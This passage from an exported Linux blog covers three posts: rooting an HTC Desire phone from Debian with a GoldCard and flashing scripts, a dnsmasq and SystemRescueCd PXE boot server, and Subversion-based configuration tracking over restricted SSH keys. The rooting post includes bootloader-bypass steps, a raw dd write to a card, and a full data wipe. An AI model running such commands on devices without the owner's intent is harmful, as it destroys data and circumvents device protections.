Desire under Debian", "url": "/posts/root-htc-desire-under-debian/", "categories": "Android, linux-old.xvx.cz", "tags": "htc-desire, adb", "date": "2010-05-04 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2010/05/root-htc-desire-under-debian/ Two weeks ago I bought HTC Desire cell phone and I decided to get root on it. Rooting guide for this phone was published a few days ago, but most of it is “windows only”. Here you can find out how to get root on the HTC Desire using Debian. Download the zip file from the HTC Desire rooting guide and unzip it: mkdir -v /var/tmp/android cd /var/tmp/android || exit wget http://www.romraid.com/paul/bravo/r4-desire-root.zip unzip r4-desire-root.zip If you are using a 64-bit version of Debian, please install ia32-libs first, because adb binary is 32-bit. apt-get install ia32-libs Enable USB debug mode in your phone by pressing Settings -&gt; Applications -&gt; Development -&gt; USB debugging and get the CID number: cd /var/tmp/android || exit ./adb-linux shell cat /sys/class/mmc_host/mmc1/mmc1:*/cid 03534453553034478001bada0400a1f2 Put the output string to the following page: https://hexrev.soaa.me/ You get another number (00a10004daba01804734305553445303) which you need to put to a GoldCard generator form together with your email address. Then you should receive email with your GoldCard image goldcard.img. Connect your phone to the computer in “Disk drive” mode and put this image to your microSD card. (Backup your data from the card before running this command!) dd if=/var/tmp/goldcard.img of=/dev/mmcblk1 0+1 records in 0+1 records out 384 bytes (384 B) copied, 0.00537284 s, 71.5 kB/s Turn off your HTC Desire and turn it back on by holding the “back” button. You should see “FASTBOOT” written on the screen in a red box. Connect your phone to the PC and run: cd /var/tmp/android || exit ./step1-linux.sh Desire Root Step 1 Erasing cache and rebooting in RUU mode... erasing 'cache'... OKAY ... OKAY About to start flash... &lt; waiting for device &gt; sending 'zip' (137446 KB)... OKAY writing 'zip'... INFOadopting the signature contained in this image... INFOsignature checking... INFOzip header checking... INFOzip info parsing... INFOchecking model ID... INFOchecking custom ID... INFOchecking main version... INFOstart image[hboot] unzipping for pre-update check... INFOstart image[hboot] flushing... INFO[RUU]WP,hboot,0 INFO[RUU]WP,hboot,100 INFOstart image[radio] unzipping for pre-update... INFOstart image[radio] flushing... INFO[RUU]WP,radio,0 INFO[RUU]WP,radio,6 INFO[RUU]WP,radio,14 INFO[RUU]WP,radio,19 INFO[RUU]WP,radio,27 INFO[RUU]WP,radio,36 INFO[RUU]WP,radio,44 INFO[RUU]WP,radio,51 INFO[RUU]WP,radio,59 INFO[RUU]WP,radio,100 FAILED (remote: 90 hboot pre-update! please flush image again immediately) &lt; waiting for device &gt; sending 'zip' (137446 KB)... OKAY writing 'zip'... INFOadopting the signature contained in this image... INFOsignature checking... INFOzip header checking... INFOzip info parsing... INFOchecking model ID... INFOchecking custom ID... INFOchecking main version... INFOstart image[boot] unzipping &amp; flushing... INFO[RUU]UZ,boot,0 INFO[RUU]UZ,boot,40 INFO[RUU]UZ,boot,85 INFO[RUU]UZ,boot,100 INFO[RUU]WP,boot,0 INFO[RUU]WP,boot,45 INFO[RUU]WP,boot,90 INFO[RUU]WP,boot,100 INFOstart image[rcdata] unzipping &amp; flushing... INFO[RUU]UZ,rcdata,0 INFO[RUU]WP,rcdata,0 INFO[RUU]WP,rcdata,100 INFOstart image[recovery] unzipping &amp; flushing... INFO[RUU]UZ,recovery,0 INFO[RUU]UZ,recovery,24 INFO[RUU]UZ,recovery,44 INFO[RUU]UZ,recovery,65 INFO[RUU]UZ,recovery,93 INFO[RUU]UZ,recovery,100 INFO[RUU]WP,recovery,0 INFO[RUU]WP,recovery,22 INFO[RUU]WP,recovery,44 INFO[RUU]WP,recovery,67 INFO[RUU]WP,recovery,89 INFO[RUU]WP,recovery,100 INFOstart image[sp1] unzipping &amp; flushing... INFO[RUU]UZ,sp1,0 INFO[RUU]UZ,sp1,100 INFO[RUU]WP,sp1,0 INFO[RUU]WP,sp1,100 INFOstart image[system] unzipping &amp; flushing... INFO[RUU]UZ,system,0 INFO[RUU]UZ,system,3 INFO[RUU]UZ,system,7 INFO[RUU]UZ,system,12 INFO[RUU]UZ,system,16 INFO[RUU]UZ,system,20 INFO[RUU]UZ,system,25 INFO[RUU]UZ,system,29 INFO[RUU]UZ,system,33 INFO[RUU]UZ,system,37 INFO[RUU]UZ,system,41 INFO[RUU]UZ,system,45 INFO[RUU]UZ,system,50 INFO[RUU]UZ,system,54 INFO[RUU]UZ,system,58 INFO[RUU]UZ,system,62 INFO[RUU]UZ,system,66 INFO[RUU]WP,system,0 INFO[RUU]WP,system,66 INFO[RUU]UZ,system,66 INFO[RUU]UZ,system,68 INFO[RUU]UZ,system,70 INFO[RUU]UZ,system,72 INFO[RUU]UZ,system,74 INFO[RUU]UZ,system,76 INFO[RUU]UZ,system,78 INFO[RUU]UZ,system,80 INFO[RUU]UZ,system,83 INFO[RUU]UZ,system,85 INFO[RUU]UZ,system,87 INFO[RUU]UZ,system,89 INFO[RUU]UZ,system,91 INFO[RUU]UZ,system,93 INFO[RUU]UZ,system,96 INFO[RUU]UZ,system,98 INFO[RUU]UZ,system,100 INFO[RUU]WP,system,66 INFO[RUU]WP,system,68 INFO[RUU]WP,system,70 INFO[RUU]WP,system,72 INFO[RUU]WP,system,74 INFO[RUU]WP,system,76 INFO[RUU]WP,system,78 INFO[RUU]WP,system,80 INFO[RUU]WP,system,83 INFO[RUU]WP,system,85 INFO[RUU]WP,system,87 INFO[RUU]WP,system,89 INFO[RUU]WP,system,91 INFO[RUU]WP,system,94 INFO[RUU]WP,system,96 INFO[RUU]WP,system,98 INFO[RUU]WP,system,100 INFOstart image[userdata] unzipping &amp; flushing... INFO[RUU]UZ,userdata,0 INFO[RUU]UZ,userdata,100 INFO[RUU]WP,userdata,0 INFO[RUU]WP,userdata,100 OKAY Rebooting to bootloader... rebooting into bootloader... OKAY Step 1 complete - now use the bootloader menu to enter recovery mode. To do this, press the power button, wait a few seconds, then use the volume keys and power button to select the RECOVERY option. Now navigate to “BOOTLOADER” using the volume keys and use power button to select. Then select “RECOVERY” and press power again. Wait 10 seconds until the white HTC screen disappears and run: time ./step2-linux.sh Desire Root Step 2 Pushing required files to device... * daemon not running. starting it now * * daemon started successfully * push: files/sbin/sdparted -&gt; /sbin/sdparted push: files/sbin/mkyaffs2image -&gt; /sbin/mkyaffs2image push: files/sbin/toolbox -&gt; /sbin/toolbox push: files/sbin/busybox -&gt; /sbin/busybox push: files/sbin/adbd -&gt; /sbin/adbd push: files/sbin/flash_image -&gt; /sbin/flash_image push: files/sbin/fix_permissions -&gt; /sbin/fix_permissions push: files/sbin/um -&gt; /sbin/um push: files/sbin/parted -&gt; /sbin/parted push: files/sbin/wipe -&gt; /sbin/wipe push: files/sbin/log2sd -&gt; /sbin/log2sd push: files/sbin/tune2fs -&gt; /sbin/tune2fs push: files/sbin/mke2fs -&gt; /sbin/mke2fs push: files/sbin/reboot -&gt; /sbin/reboot push: files/sbin/unyaffs -&gt; /sbin/unyaffs push: files/sbin/nandroid-mobile.sh -&gt; /sbin/nandroid-mobile.sh push: files/sbin/dump_image -&gt; /sbin/dump_image push: files/sbin/ums_toggle -&gt; /sbin/ums_toggle push: files/sbin/e2fsck -&gt; /sbin/e2fsck push: files/sbin/recovery -&gt; /sbin/recovery push: files/sbin/backuptool.sh -&gt; /sbin/backuptool.sh push: files/sbin/fs -&gt; /sbin/fs push: files/etc/mtab -&gt; /etc/mtab push: files/etc/fstab -&gt; /etc/fstab push: files/system/lib/libc.so -&gt; /system/lib/libc.so push: files/system/lib/libcutils.so -&gt; /system/lib/libcutils.so push: files/system/lib/libm.so -&gt; /system/lib/libm.so push: files/system/lib/liblog.so -&gt; /system/lib/liblog.so push: files/system/lib/libstdc++.so -&gt; /system/lib/libstdc++.so push: files/system/bin/sh -&gt; /system/bin/sh push: files/system/bin/linker -&gt; /system/bin/linker 31 files pushed. 0 files skipped. 1944 KB/s (3709881 bytes in 1.863s) Pushing update file to device sdcard - this may take a few minutes... 1903 KB/s (126444599 bytes in 64.861s) Now wipe and apply rootedupdate.zip from the recovery image menu. real 1m9.999s user 0m0.012s sys 0m0.088s Navigate to “Wipe” option using optical trackball and continue with “Wipe Data/Factory Reset” - this will erase all the data in the phone! Then go back to the main recovery menu by pressing volume (-) button and select “Flash zip from sdcard” and choose “rootedupdate.zip”. Then your phone will be flashed and you can select “Reboot system now” to get back to the !rooted! phone. You can check your Software information to see the current version of the ROM 1.15.405.4 by selecting Settings -&gt; About phone -&gt; Software information -&gt; Software number. Good luck ;-)" }, { "title": "PXE server using Dnsmasq and SystemRescueCd with minimal effort", "url": "/posts/pxe-server-using-dnsmasq-and-systemrescuecd-with-minimal-effort/", "categories": "Linux, Networking, linux-old.xvx.cz", "tags": "pxe, dnsmasq, grub", "date": "2010-04-11 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2010/04/pxe-server-using-dnsmasq-and-systemrescuecd-with-minimal-effort/ If you are using DHCP server in your network environment, it’s handy to be able to boot from the network. It brings you many advantages especially when you are not able to boot the operating system from the workstation’s disk. I would like to describe my experience with DHCP server called Dnsmasq. This software can also serve TFTP requests and act as DNS forwarder. There are many how-to pages on how to set up PXE. In most of them you need NFS, xinetd or similar CPU/memory consuming stuff. You can see how you can set up a working boot environment “only” with the ISO image of SystemRescueCd and dnsmasq. Let’s start with installing dnsmasq and downloading the ISO image of SystemRescueCd: aptitude install dnsmasq bzip2 mkdir -vp /home/ftp/pub/distributions cd /home/ftp/pub/distributions || exit wget http://sourceforge.net/projects/systemrescuecd/files/sysresccd-x86/1.5.1/systemrescuecd-x86-1.5.1.iso/download Mount ISO file and make it permanent in fstab: mkdir -v systemrescuecd tftpboot echo \"$(readlink -f systemrescuecd*.iso) $PWD/systemrescuecd iso9660 ro,loop,auto 0 0\" &gt;&gt; /etc/fstab mount systemrescuecd Fill tftpboot directory with necessary files/links: mkdir -v tftpboot/pxelinux.cfg sed 's@initrd=initram.igz@initrd=initram.igz netboot=tftp://192.168.0.1/sysrcd.dat rootpass=xxxx setkmap=us@' systemrescuecd/isolinux/isolinux.cfg &gt; tftpboot/pxelinux.cfg/default for FILE in systemrescuecd/isolinux/* systemrescuecd/sysrcd* systemrescuecd/ntpasswd systemrescuecd/bootdisk; do ln -vs \"../$FILE\" \"tftpboot/$(basename \"$FILE\")\" done wget http://www.kernel.org/pub/linux/utils/boot/syslinux/syslinux-3.86.tar.bz2 -O - | tar xvjf - --to-stdout syslinux-3.86/core/pxelinux.0 &gt; tftpboot/pxelinux.0 Configure dnsmasq to listen on eth1: mv -v /etc/dnsmasq.conf /etc/dnsmasq.conf.old cat &lt;&lt; EOF &gt; /etc/dnsmasq.conf domain-needed bogus-priv interface=eth1 bind-interfaces expand-hosts domain=linux.xvx.cz dhcp-range=192.168.0.50,192.168.0.150,12h dhcp-boot=pxelinux.0 enable-tftp tftp-root=$PWD/tftpboot EOF Restart dnsmasq daemon and try to boot over network from computer connected to eth1 interface. ifconfig eth1 192.168.0.1 netmask 255.255.255.0 dnsmasq --keep-in-foreground --no-daemon --log-queries --log-facility=/tmp/dnsmasq_log --log-dhcp --dhcp-leasefile=/tmp/dhcp-leasefile You should see something like (I included examples for 100 Mbit and 1 Gbit network to see the speed difference): Another example from VirtualBox: Dnsmasq produced this output: root@debian:/home/ftp/pub/distributions# dnsmasq --keep-in-foreground --no-daemon --log-queries --log-facility=/tmp/dnsmasq_log --log-dhcp --dhcp-leasefile=/tmp/dhcp-leasefile dnsmasq: started, version 2.52 cachesize 150 dnsmasq: compile time options: IPv6 GNU-getopt DBus I18N DHCP TFTP dnsmasq-dhcp: DHCP, IP range 192.168.0.50 -- 192.168.0.150, lease time 12h dnsmasq-tftp: TFTP root is /home/ftp/pub/distributions/tftpboot dnsmasq: reading /etc/resolv.conf dnsmasq: using nameserver 208.67.220.220#53 dnsmasq: ignoring nameserver 192.168.0.1 - local interface dnsmasq: read /etc/hosts - 7 addresses dnsmasq-dhcp: 3587244887 Available DHCP range: 192.168.0.50 -- 192.168.0.150 dnsmasq-dhcp: 3587244887 Vendor class: PXEClient:Arch:00000:UNDI:002001 dnsmasq-dhcp: 3587244887 DHCPDISCOVER(eth1) 00:13:d4:d1:03:57 dnsmasq-dhcp: 3587244887 DHCPOFFER(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 3587244887 requested options: 1:netmask, 2:time-offset, 3:router, 5, 6:dns-server, dnsmasq-dhcp: 3587244887 requested options: 11, 12:hostname, 13:boot-file-size, 15:domain-name, dnsmasq-dhcp: 3587244887 requested options: 16:swap-server, 17:root-path, 18:extension-path, dnsmasq-dhcp: 3587244887 requested options: 43:vendor-encap, 54:server-identifier, 60:vendor-class, dnsmasq-dhcp: 3587244887 requested options: 67:bootfile-name, 128, 129, 130, 131, 132, dnsmasq-dhcp: 3587244887 requested options: 133, 134, 135 dnsmasq-dhcp: 3587244887 tags: eth1 dnsmasq-dhcp: 3587244887 next server: 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 1 option: 53:message-type 02 dnsmasq-dhcp: 3587244887 sent size: 4 option: 54:server-identifier 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 4 option: 51:lease-time 00:00:a8:c0 dnsmasq-dhcp: 3587244887 sent size: 4 option: 58:T1 00:00:54:60 dnsmasq-dhcp: 3587244887 sent size: 4 option: 59:T2 00:00:93:a8 dnsmasq-dhcp: 3587244887 sent size: 11 option: 67:bootfile-name 70:78:65:6c:69:6e:75:78:2e:30:00 dnsmasq-dhcp: 3587244887 sent size: 4 option: 1:netmask 255.255.255.0 dnsmasq-dhcp: 3587244887 sent size: 4 option: 28:broadcast 192.168.0.255 dnsmasq-dhcp: 3587244887 sent size: 4 option: 3:router 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 4 option: 6:dns-server 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 13 option: 15:domain-name linux.xvx.cz dnsmasq-dhcp: 3587244887 Available DHCP range: 192.168.0.50 -- 192.168.0.150 dnsmasq-dhcp: 3587244887 Vendor class: PXEClient:Arch:00000:UNDI:002001 dnsmasq-dhcp: 3587244887 DHCPREQUEST(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 3587244887 DHCPACK(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 3587244887 requested options: 1:netmask, 2:time-offset, 3:router, 5, 6:dns-server, dnsmasq-dhcp: 3587244887 requested options: 11, 12:hostname, 13:boot-file-size, 15:domain-name, dnsmasq-dhcp: 3587244887 requested options: 16:swap-server, 17:root-path, 18:extension-path, dnsmasq-dhcp: 3587244887 requested options: 43:vendor-encap, 54:server-identifier, 60:vendor-class, dnsmasq-dhcp: 3587244887 requested options: 67:bootfile-name, 128, 129, 130, 131, 132, dnsmasq-dhcp: 3587244887 requested options: 133, 134, 135 dnsmasq-dhcp: 3587244887 tags: eth1 dnsmasq-dhcp: 3587244887 next server: 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 1 option: 53:message-type 05 dnsmasq-dhcp: 3587244887 sent size: 4 option: 54:server-identifier 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 4 option: 51:lease-time 00:00:a8:c0 dnsmasq-dhcp: 3587244887 sent size: 4 option: 58:T1 00:00:54:60 dnsmasq-dhcp: 3587244887 sent size: 4 option: 59:T2 00:00:93:a8 dnsmasq-dhcp: 3587244887 sent size: 11 option: 67:bootfile-name 70:78:65:6c:69:6e:75:78:2e:30:00 dnsmasq-dhcp: 3587244887 sent size: 4 option: 1:netmask 255.255.255.0 dnsmasq-dhcp: 3587244887 sent size: 4 option: 28:broadcast 192.168.0.255 dnsmasq-dhcp: 3587244887 sent size: 4 option: 3:router 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 4 option: 6:dns-server 192.168.0.1 dnsmasq-dhcp: 3587244887 sent size: 13 option: 15:domain-name linux.xvx.cz dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/pxelinux.0 to 192.168.0.90 dnsmasq-tftp: error 0 TFTP Aborted received from 192.168.0.90 dnsmasq-tftp: failed sending /home/ftp/pub/distributions/tftpboot/pxelinux.0 to 192.168.0.90 dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/pxelinux.0 to 192.168.0.90 dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/28ce5d8a-0000-0080-385d-ff0000004746 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/01-00-13-d4-d1-03-57 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A8005A not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A8005 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A800 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A80 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A8 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0A not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C0 not found dnsmasq-tftp: file /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/C not found dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/pxelinux.cfg/default to 192.168.0.90 dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/f1boot.msg to 192.168.0.90 dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/rescuecd to 192.168.0.90 dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/initram.igz to 192.168.0.90 dnsmasq-dhcp: 804374645 Available DHCP range: 192.168.0.50 -- 192.168.0.150 dnsmasq-dhcp: 804374645 Vendor class: udhcp 1.15.3 dnsmasq-dhcp: 804374645 DHCPDISCOVER(eth1) 00:13:d4:d1:03:57 dnsmasq-dhcp: 804374645 DHCPOFFER(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 804374645 requested options: 1:netmask, 3:router, 6:dns-server, 12:hostname, dnsmasq-dhcp: 804374645 requested options: 15:domain-name, 28:broadcast, 42:ntp-server dnsmasq-dhcp: 804374645 tags: eth1 dnsmasq-dhcp: 804374645 bootfile name: pxelinux.0 dnsmasq-dhcp: 804374645 next server: 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 1 option: 53:message-type 02 dnsmasq-dhcp: 804374645 sent size: 4 option: 54:server-identifier 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 4 option: 51:lease-time 00:00:a8:c0 dnsmasq-dhcp: 804374645 sent size: 4 option: 58:T1 00:00:54:60 dnsmasq-dhcp: 804374645 sent size: 4 option: 59:T2 00:00:93:a8 dnsmasq-dhcp: 804374645 sent size: 4 option: 1:netmask 255.255.255.0 dnsmasq-dhcp: 804374645 sent size: 4 option: 28:broadcast 192.168.0.255 dnsmasq-dhcp: 804374645 sent size: 4 option: 3:router 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 4 option: 6:dns-server 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 13 option: 15:domain-name linux.xvx.cz dnsmasq-dhcp: 804374645 Available DHCP range: 192.168.0.50 -- 192.168.0.150 dnsmasq-dhcp: 804374645 Vendor class: udhcp 1.15.3 dnsmasq-dhcp: 804374645 DHCPREQUEST(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 804374645 DHCPACK(eth1) 192.168.0.90 00:13:d4:d1:03:57 dnsmasq-dhcp: 804374645 requested options: 1:netmask, 3:router, 6:dns-server, 12:hostname, dnsmasq-dhcp: 804374645 requested options: 15:domain-name, 28:broadcast, 42:ntp-server dnsmasq-dhcp: 804374645 tags: eth1 dnsmasq-dhcp: 804374645 bootfile name: pxelinux.0 dnsmasq-dhcp: 804374645 next server: 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 1 option: 53:message-type 05 dnsmasq-dhcp: 804374645 sent size: 4 option: 54:server-identifier 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 4 option: 51:lease-time 00:00:a8:c0 dnsmasq-dhcp: 804374645 sent size: 4 option: 58:T1 00:00:54:60 dnsmasq-dhcp: 804374645 sent size: 4 option: 59:T2 00:00:93:a8 dnsmasq-dhcp: 804374645 sent size: 4 option: 1:netmask 255.255.255.0 dnsmasq-dhcp: 804374645 sent size: 4 option: 28:broadcast 192.168.0.255 dnsmasq-dhcp: 804374645 sent size: 4 option: 3:router 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 4 option: 6:dns-server 192.168.0.1 dnsmasq-dhcp: 804374645 sent size: 13 option: 15:domain-name linux.xvx.cz dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/sysrcd.md5 to 192.168.0.90 dnsmasq-tftp: sent /home/ftp/pub/distributions/tftpboot/sysrcd.dat to 192.168.0.90 To enable NAT and routing for the hosts run these commands: iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sed --in-place=.old 's/^#\\(net.ipv4.ip_forward=1\\)/\\1/' /etc/sysctl.conf sysctl -p The SystemRescueCd guys did a great job. If you have similar PXE SystemRescueCd installation like I described above it’s handy to put these lines into GRUB2 configuration to be able to boot it when something goes wrong with the Linux box: cat &lt;&lt; EOF &gt;&gt; /etc/grub.d/40_custom menuentry \"SystemRescueCd 1.5.1\" { loopback loop /home/ftp/pub/distributions/systemrescuecd-x86-1.5.1.iso linux (loop)/isolinux/rescue64 docache setkmap=us rootpass=xxxx isoloop=/home/ftp/pub/distributions/systemrescuecd-x86-1.5.1.iso rdinit=/linuxrc2 initrd (loop)/isolinux/initram.igz } EOF update-grub Good luck ;-)" }, { "title": "SVN used for configuration management", "url": "/posts/svn-used-for-configuration-management/", "categories": "Linux, DevOps, linux-old.xvx.cz", "tags": "automation", "date": "2010-03-29 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2010/03/svn-used-for-configuration-management/ Like every UNIX server admin, I’m using many various text-based configurations on my machines. It’s important to track “every” change of these important files to prevent problems with service stability. I decided to set up Subversion server and store all useful configurations from my Linux boxes there. For this purpose I wrote script svnci which is used to save/delete/update files from svn. You can of course save all necessary files to SVN by hand, but it’s quicker to write a short parser for it. The idea is to create the main repository “system_configs” where you will have subdirectories correspond to hostnames of your machines: /var/lib/svn-repos/ └── system_configs ├── debian └── czbrn0208 Then the access rights are set for each host to access the right directory in SVN. Then you should be able to commit changes to SVN using svn+ssh and private keys. Use cron to automatically check changes in your files and add them to SVN. Here is an example of how I installed subversion server on Debian and managed configuration files in it. SVN server installation and configuration together with WebSVN Install necessary software: aptitude install openssh-server subversion websvn Prepare SVN directory: useradd svn mkdir /home/svn mkdir /home/svn/.ssh mkdir /var/lib/svn-repos chown -R svn:svn /home/svn svnadmin create --fs-type fsfs /var/lib/svn-repos/system_configs Now it’s necessary to set up access rights for servers which will read/write configuration to your SVN server. In my example I will use servers with hostnames debian and czbrn0208. authz: cat &gt;&gt; /var/lib/svn-repos/system_configs/conf/authz &lt;&lt; EOF [/czbrn0208] czbrn0208 = rw [/debian] debian = rw EOF svnserve.conf: cat &gt;&gt; /var/lib/svn-repos/system_configs/conf/svnserve.conf &lt;&lt; EOF [general] authz-db = authz anon-access = none EOF Now you have to create directory structure matching the hostnames and import it to SVN: mkdir -p /tmp/repo/debian /tmp/repo/czbrn0208 svn import /tmp/repo file:///var/lib/svn-repos/system_configs -m \"Initial import ($(date +\"%F %T\"))\" rm -rf /tmp/repo We should also change rights to svn user: chmod -R g+w /var/lib/svn-repos/system_configs chown -R svn:svn /var/lib/svn-repos You should check your SVN directory structure and it should look like: root@debian:/ svnlook tree /var/lib/svn-repos/system_configs / debian/ czbrn0208/ Now you need to add public keys to: /home/svn/.ssh/authorized_keys to allow access from hosts to SVN server using svn+ssh. I include here also ssh key generation: root@debian:/ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory '/root/.ssh'. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: e4:e7:b9:75:10:97:e4:4b:28:2d:ad:69:65:d2:3d:78 root@debian The key's randomart image is: +--[ RSA 2048]----+ | . | | + * . | | . + X E | | o O = o | | S = . . | | + . . | | o . . | | o . | | . | +-----------------+ Now you should save $HOME/.ssh/id_rsa.pub to /home/svn/.ssh/authorized_keys like: root@debian:/ echo \"command=\\\"/usr/bin/svnserve -t -r /var/lib/svn-repos/system_configs \\ --tunnel-user=`hostname`\\\",no-port-forwarding,no-pty,no-agent-forwarding,no-X11-forwarding \\ `cat $HOME/.ssh/id_rsa.pub`\" &gt;&gt; /home/svn/.ssh/authorized_keys I should do the same for my second host czbrn0208, but I have to first transfer its public key to the server and then run a similar command: root@debian:/ echo \"command=\\\"/usr/bin/svnserve -t -r /var/lib/svn-repos/system_configs \\ --tunnel-user=czbrn0208\\\",no-port-forwarding,no-pty,no-agent-forwarding,no-X11-forwarding \\ `ssh root@czbrn0208 \"cat /root/.ssh/id_rsa.pub\"`\" &gt;&gt; /home/svn/.ssh/authorized_keys root@debian:/ cat /home/svn/.ssh/authorized_keys command=\"/usr/bin/svnserve -t -r /var/lib/svn-repos --tunnel-user=debian\",no-port-forwarding,no-pty,no-agent-forwarding,no-X11-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7INCS6YC4VtsBpPa7H3sg4grSeRXSosWhWFzqyNDf++pau37DH1wZYCunfBpJjbiVMFJnOoT3LPmNc7DUTipEUAbz8p9XNt20qG8edLuf2zJ1VrqCxTydIJon+X+ZT6CI95v6/xG3SBevRKaV07kwzxIPdLMhJKdF0d7HKUOGTgWrWGIoRCnxSyIO5Jn7qEA+7/h7IYZo94IOedwDi1009akOfU73Iw/ArxtDAM752UNf7Y0gANtJRngBdT1nkiW1Yko2OPMG+gMDkc4bZ14TYqXzHeFHSGD/ipZlKn9czry3z5Pw5quI/K6m6uaWP9WuMC/CEjhRmNbOpsVRNg00Q== root@debian command=\"/usr/bin/svnserve -t -r /var/lib/svn-repos/system_configs --tunnel-user=czbrn0208\",no-port-forwarding,no-pty,no-agent-forwarding,no-X11-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4p/ax75qZ5KiI1j3uy3rmgNFjyaxflKdVN0mQKPg4xzHAIy2cVdAk9eVdmNJOCKzjJej4dEL2NwgR0LDaaVJelZt2tI/GMZj4VnxLyAJQeJEeyMuUccwDJLF4X6CtUP22f7dzkHe6ovpRgBdUiuNWlmmOVkTwJqgQMp6P7c5BtKA60VLWvu1dfnChbJ8hay+9y890n893egOm6aAHpzbsaSPF0DxqrkNnVYrabOh4Y7HoXuKwJNdQtbR0zKdnURTk+GWMiUgyMU5NkEAC9GqAzVN/t+4NWZHDWuS1VlBdNbt1pmfMNhlUAIm/tsWtPdPwYEnI8MqolQHnHSDw9KYeQ== root@czbrn0208 Now you should be able to access SVN from the hosts: root@debian:/ mkdir /root/configuration-`hostname` root@debian:/ svn co svn+ssh://svn@debian.xvx.cz/`hostname` /root/configuration-`hostname` root@czbrn0208:~ mkdir /root/configuration-`hostname` root@czbrn0208:~ svn co svn+ssh://svn@debian.xvx.cz/`hostname` /root/configuration-`hostname` Now your repositories are ready to import the first files/directories: cp /etc/rc.local \"/root/configuration-$(hostname)/\" svn add /root/configuration-debian/rc.local svn ci --message \"Test\" /root/configuration-debian/ Now there should be the first file in the repository. Now you can access your repository by WebSVN using https://my_server/websvn. Everybody likes screenshots so I put there some from my own SVN server: Script svnci Here is a link for my script which can help you add/update/remove from the SVN repository without deep knowledge of it: svnci. I use it because it’s faster and easier to remember than learning various SVN commands combined with shell - so here are some examples: Add files to repository: gate:/etc/freeradius# svnci sql.conf `/etc/freeradius/sql.conf' -&gt; `/root/configuration-gate/etc/freeradius/sql.conf' A /root/configuration-gate/etc/freeradius/sql.conf Adding root/configuration-gate/etc/freeradius/sql.conf Sending root/configuration-gate/files Transmitting file data .. Committed revision 36. Initial: /etc/freeradius/sql.conf gate:/# svnci /etc/freeradius/sites-available/default /etc/freeradius/sites-available -&gt; /root/configuration-gate/etc/freeradius/sites-available `/etc/freeradius/sites-available/default' -&gt; `/root/configuration-gate/etc/freeradius/sites-available/default' A /root/configuration-gate/etc/freeradius/sites-available A /root/configuration-gate/etc/freeradius/sites-available/default Adding root/configuration-gate/etc/freeradius/sites-available Adding root/configuration-gate/etc/freeradius/sites-available/default Sending root/configuration-gate/files Transmitting file data .. Committed revision 37. Initial: /etc/freeradius/sites-available/default Add directory to repository: gate:/etc# ls -ld cron.monthly drwxr-xr-x 2 root root 4096 2010-02-25 17:02 cron.monthly gate:/etc# svnci cron.monthly /etc/cron.monthly -&gt; /root/configuration-gate/etc/cron.monthly `/etc/cron.monthly/.placeholder' -&gt; `/root/configuration-gate/etc/cron.monthly/.placeholder' `/etc/cron.monthly/debsums' -&gt; `/root/configuration-gate/etc/cron.monthly/debsums' `/etc/cron.monthly/standard' -&gt; `/root/configuration-gate/etc/cron.monthly/standard' A /root/configuration-gate/etc/cron.monthly A /root/configuration-gate/etc/cron.monthly/.placeholder A /root/configuration-gate/etc/cron.monthly/debsums A /root/configuration-gate/etc/cron.monthly/standard Adding root/configuration-gate/etc/cron.monthly Adding root/configuration-gate/etc/cron.monthly/.placeholder Adding root/configuration-gate/etc/cron.monthly/debsums Adding root/configuration-gate/etc/cron.monthly/standard Sending root/configuration-gate/files Transmitting file data .... Committed revision 38. Initial: /etc/cron.monthly/ Removing file(s): gate:/etc# cd cron.monthly gate:/etc/cron.monthly# svnci -r debsums standard Removing /etc/cron.monthly/debsums from repository: D /root/configuration-gate/etc/cron.monthly/debsums Removing /etc/cron.monthly/standard from repository: D 